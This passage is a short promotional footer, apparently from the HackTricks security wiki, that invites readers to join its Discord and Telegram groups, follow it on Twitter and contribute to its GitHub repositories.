* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
